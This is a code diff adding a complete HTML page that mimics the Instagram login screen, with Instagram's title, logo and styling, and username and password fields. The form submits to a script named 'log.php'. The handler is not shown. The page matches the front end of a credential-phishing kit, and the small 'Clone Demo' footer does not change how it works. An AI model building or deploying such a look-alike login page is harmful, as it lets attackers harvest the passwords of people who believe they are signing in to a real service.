@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #fafafa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .login-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 350px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+      border-radius: 5px;
+    }
+
+    .login-box img {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      font-size: 14px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .login-box .or {
+      margin: 20px 0;
+      font-size: 13px;
+      color: #999;
+    }
+
+    .login-box a {
+      font-size: 12px;
+      text-decoration: none;
+      color: #00376b;
+      display: block;
+      margin-top: 12px;
+    }
+
+    .signup-box {
+      margin-top: 15px;
+      padding: 20px;
+      width: 350px;
+      text-align: center;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      color: #3897f0;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    footer {
+      margin-top: 50px;
+      font-size: 12px;
+      color: #999;
+      text-align: center;
+    }
+
+    footer p {
+      margin: 4px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">
+      <form action="log.php" method="POST">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+        <div class="or">OR</div>
+        <a href="#">Forgot password?</a>
+      </form>
+    </div>
+
+    <div class="signup-box">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <footer>
+      <p>Meta © 2023 | Instagram Clone Demo</p>
+    </footer>
+  </div>
+</body>
+</html>
